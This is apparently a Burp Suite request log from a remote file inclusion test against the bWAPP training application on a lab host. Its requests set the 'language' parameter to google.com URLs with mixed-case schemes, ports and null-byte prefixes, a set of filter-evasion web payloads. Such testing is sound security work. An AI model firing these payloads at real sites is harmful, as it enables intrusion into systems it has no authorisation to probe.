+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=https%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTPS%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTPS%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTPS%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTPS%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HTTPS%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTp%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTp%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTp%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTp%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTp%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTpS%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTpS%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTpS%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTpS%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=HtTpS%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00http%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00http%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00http%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00www.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00www.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00www.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTP%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTP%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTP%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTP%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTP%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00https%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00https%3A%2F%2Fwww.google.com%3A80%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00https%3A%2F%2Fwww.google.com&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00https%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/rlfi.php?language=%00HTTPS%3A%2F%2Fwww.google.com%2F&action=go HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://192.168.118.128/bWAPP/rlfi.php?language=lang_en.php&action=go
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+X-Burp-Comment:   |  
+
+
+========
